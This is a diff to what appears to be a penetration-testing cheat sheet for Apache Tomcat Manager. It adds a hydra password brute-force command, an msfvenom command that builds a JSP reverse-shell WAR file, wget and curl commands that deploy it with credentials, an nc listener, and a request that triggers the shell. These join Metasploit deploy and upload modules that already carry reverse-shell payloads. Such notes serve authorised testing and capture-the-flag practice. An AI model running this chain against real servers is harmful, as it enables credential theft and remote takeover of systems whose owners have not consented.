@@ -8,6 +8,10 @@ msf > run
 msf > services -p 8080 -S "Tomcat Manager" -R
 
 
+# Bruteforce Login (hydra)
+
+hydra -L <USERS_LIST> -P <PASSWORDS_LIST> -f <IP> http-get /manager/html -vV -u -o hydra_tomcat_report.txt
+
 # Exploiting Tomcat (Way 1)
 msf > use exploit/multi/http/tomcat_mgr_deploy
 
@@ -19,5 +23,27 @@ msf > use exploit/multi/http/tomcat_mgr_upload
 
 msf > set payload java/meterpreter/reverse_https    ;; to directly get a meterpreter shell.
 msf > set payload java/shell/reverse_tcp            ;; to get the system level shell
+
+# Exploiting Tomcat from panel
+Generate payload
+
+ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
+
+Upload payload
+- Tomcat6:
+
+ wget 'http://<USER>:<PASSWORD>@<IP>:8080/manager/deploy?war=file:shell.war&path=/shell' -O -
+
+- Tomcat7 and above:
+
+ curl -v -u <USER>:<PASSWORD> -T shell.war 'http://<IP>:8080/manager/text/deploy?path=/shellh&update=true'
+
+Start Listener:
+
+    nc -lvp <PORT>
+
+Execute payload:
+
+    curl http://<IP>:8080/shell/
 
 
